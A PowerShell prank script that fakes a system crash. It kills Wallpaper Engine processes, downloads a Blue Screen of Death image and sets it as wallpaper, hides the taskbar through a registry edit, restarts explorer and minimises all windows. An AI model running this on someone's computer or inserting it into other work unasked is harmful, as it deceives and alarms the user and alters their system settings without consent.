$code = @'
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
'@

Add-Type -TypeDefinition $code

# Kill specific Wallpaper Engine processes
$processNames = @(
    "wallpaper64",
    "wallpaper32",
    "webwallpaper64",
    "webwallpaper32",
    "wallpaperservice32"
)

foreach ($processName in $processNames) {
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# Download BSOD image
$imageUrl = "https://images5.alphacoders.com/104/1042554.png"
$imagePath = "$env:USERPROFILE\Downloads\bsod.png"
(New-Object System.Net.WebClient).DownloadFile($imageUrl, $imagePath)

# Set as wallpaper
[Win32]::SystemParametersInfo(0x0014, 0, $imagePath, 0x01 -bor 0x02)

# Hide taskbar
$RegPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
$RegKey = (Get-ItemProperty -Path $RegPath).Settings
$RegKey[8] = 3  # Hide taskbar
Set-ItemProperty -Path $RegPath -Name Settings -Value $RegKey

# Restart explorer to apply taskbar change
Stop-Process -Name explorer -Force
Start-Process explorer

# Wait 6 seconds and kill specific processes again if they relaunched
Start-Sleep -Seconds 6
foreach ($processName in $processNames) {
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
}

# Minimize all windows
$shell = New-Object -ComObject "Shell.Application"
$shell.MinimizeAll()
